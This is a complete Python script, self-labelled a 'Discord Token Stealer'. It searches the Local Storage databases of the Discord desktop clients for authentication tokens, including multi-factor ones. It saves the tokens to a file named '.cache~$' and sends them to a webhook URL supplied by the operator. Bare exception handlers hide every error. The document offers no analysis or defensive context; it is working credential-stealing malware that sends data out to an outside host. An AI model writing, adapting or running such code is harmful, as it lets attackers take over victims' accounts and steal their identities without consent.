import os
import re
import json
import requests
userwh = input("Enter your webhook")

def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    checked = []
    already_cached_tokens = []

    PATHS = {
        "Discord": os.getenv("APPDATA") + "\\Discord",
        "Discord Canary": os.getenv("APPDATA") + "\\discordcanary",
        "Discord PTB": os.getenv("APPDATA") + "\\discordptb"
    }

    for _, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)

    with open(".cache~$", "a") as file:
        for token in checked:
            if token not in already_cached_tokens:
                file.write(token + "\n")

    if len(checked) == 0:
        checked.append("No tokens found")

    webhook = {
        "content": "\n".join(checked),
        "username": "Discord Token Stealer"
    }

    try:
        requests.post(userwh, json=webhook)
    except:
        pass

try:
    main()
except:
    pass

